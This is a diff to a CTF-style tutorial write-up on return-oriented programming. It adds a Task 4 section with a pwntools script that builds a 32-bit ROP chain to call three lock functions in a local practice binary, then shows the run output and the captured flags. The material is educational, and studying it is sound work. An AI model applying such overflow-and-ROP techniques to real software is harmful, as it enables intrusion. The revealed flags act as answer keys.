@@ -68,7 +68,6 @@ In fact, this is enough to start writing our exploit. Here is the exploit that I
 from pwn import *
 
 context.update(arch='amd64', os='linux')
-print_flag = 0x400697
 p = process("./three_locks")
 
 #useful locations
@@ -95,7 +94,7 @@ p.sendline(payload)
 p.interactive()
 ```
 
-The address for `pop rdi; ret` was found by typing in the console `ropper -f target --search "<desire operand>"`. In the case for `pop rsi`, the only found instance is with the local variable `r15`. This is why a dummy value was passed for this. 
+The address for `pop rdi; ret` was found by typing in the console `ropper -f <target> --search "<desire operand>"`. In the case for `pop rsi`, the only found instance is with the local variable `r15`. This is why a dummy value was passed for this. 
 
 In total, what the ROP-chain does is this:
 1. `cyclic_find` gives us the location of the `ret` address, allowing us to manipulate the return address.
@@ -120,3 +119,55 @@ Lock 3 is a gimmie. If you get the other 2, this should work.
 Here is you flag (hopefully):
 flag{F1r5t_ROP_c0mpl3t3}
 ```
+## Task 4 - ROP with 32-bit binary
+Of course, with a binary accustomed to a different computer architecture, the registers, operands, and the way we do ROP change a little. The changes aren't that too big from `Task 3`. Instead of searching for `pop rdi` using `ropper` in `amd64` or in `64-bit` computers, we only need a `pop` instruction. `i386` does not use registers for functional arguments as the task above demonstrates. 
+
+To find addresses of the lock functions, use `gdb` with `p lock1` etc. This should print the address. M
+
+Our script can then be adjusted as below.
+
+```C
+from pwn import *
+
+context.update(arch='i386', os='linux')
+p = process("./three_locks_32")
+
+#useful locations
+lock1 = 0x8048506
+lock2 = 0x804856d
+lock3 = 0x80485da
+pop_ret = 0x08048361
+
+#payload construction (ropping)
+payload = cyclic(cyclic_find("jaaa"))
+payload += p32(lock1)
+payload += p32(pop_ret)
+payload += p32(5)
+payload += p32(lock2)
+payload += p32(lock3)
+payload += p32(42)
+payload += p32(1776)
+
+p.sendline(payload)
+p.interactive()
+```
+
+Running our exploit yields the result below.
+
+```console
+buzz@intro2rop:~/32_rop$ python3 exploit.py
+[+] Starting local process './three_locks_32': pid 12391
+[*] Switching to interactive mode
+We need to unlock 3 locks to print the flag!
+Lock 1 unlocked!
+Lock 2 unlocked!
+Lock 3 is a gimmie. If you get the other 2, this should work.
+Here is you flag (hopefully):
+flag{Thr33_Tw0_D0N3}
+
+[*] Got EOF while reading in interactive
+$ 
+[*] Process './three_locks_32' stopped with exit code -11 (SIGSEGV) (pid 12391)
+[*] Got EOF while sending in interactive
+```
+
